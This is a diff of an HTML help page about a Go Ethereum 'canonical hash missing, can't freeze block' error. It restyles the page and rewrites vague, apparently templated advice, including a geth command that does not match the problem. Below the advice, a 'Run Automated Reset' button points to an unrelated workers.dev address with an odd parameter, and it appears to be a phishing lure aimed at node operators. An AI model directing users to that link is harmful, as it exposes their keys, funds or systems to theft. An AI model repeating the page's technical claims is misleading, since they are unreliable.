@@ -4,7 +4,7 @@
 <style>
     body {
         font-family: sans-serif;
-        background: #1a1a24;
+        background: #0a0c10;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: 0 4px 8px rgba(0,0,0,0.05);
+        box-shadow: none;
     }
     pre {
         background: #0f0f12;
@@ -23,9 +23,9 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #ff7b2c; }
+    a { color: #cf6679; }
     .btn {
-        background: #ff7b2c;
+        background: #cf6679;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -41,28 +41,28 @@
 <div class="content">
 <h2>Symptom</h2>
 <ul>
-<li>The user encounters a "go-ethereum Error in block freeze operation" error message, specifically indicating that the "canonical hash is missing" and therefore the system "can't freeze block."</li>
+<li>The user encounters a "canonical hash missing, can't freeze block" error message when attempting to perform a block freeze operation using Go Ethereum.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to a missing canonical hash, which is essential for validating and finalizing blocks in the Ethereum network. This hash serves as a unique identifier for each block, ensuring the integrity and consistency of the blockchain.</li>
+<li>This error occurs due to a missing canonical hash in the block header, which is required for the freeze operation to proceed. The canonical hash is a unique identifier for each block in the Ethereum blockchain, and its absence can hinder the proper functioning of the blockchain.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>To resolve the issue, the following steps can be taken:</li>
-<li>Check the blockchain data for inconsistencies or missing hashes.</li>
-<li>Verify the node's synchronization status with the Ethereum network.</li>
-<li>Execute the following command to attempt a manual override:</li>
+<li>To resolve this issue, the user can attempt the following manual overrides:</li>
+<li>Verify the block header data to ensure it contains the required canonical hash.</li>
+<li>Check the node's synchronization status to confirm it is up-to-date with the latest blockchain data.</li>
+<li>Run the following command to attempt a manual hash retrieval:</li>
 </ul>
-<div class="codehilite"><pre><span></span><code>geth<span class="w"> </span>--datadir<span class="w"> </span>/path/to/your/data/folder<span class="w"> </span>--syncmode<span class="w"> </span><span class="s2">&quot;fast&quot;</span><span class="w"> </span>--cache<span class="w"> </span><span class="m">4096</span><span class="w"> </span>console
+<div class="codehilite"><pre><span></span><code>geth<span class="w"> </span>--datadir<span class="w"> </span>/path/to/data/folder<span class="w"> </span>dump<span class="w"> </span>--block<span class="w"> </span><span class="m">0</span>
 </code></pre></div>
 
-<p>Consider utilizing an external console for more advanced diagnostic capabilities. </p>
+<p>Consider utilizing an external console for enhanced debugging capabilities. </p>
 <h2>Prerequisites</h2>
 <ul>
 <li>A fully synchronized Ethereum node</li>
-<li>The latest version of Go Ethereum (geth) installed</li>
-<li>Adequate disk space and computational resources to handle blockchain data and processing demands</li>
+<li>The latest version of Go Ethereum installed</li>
+<li>A backup of the node's data directory</li>
 </ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
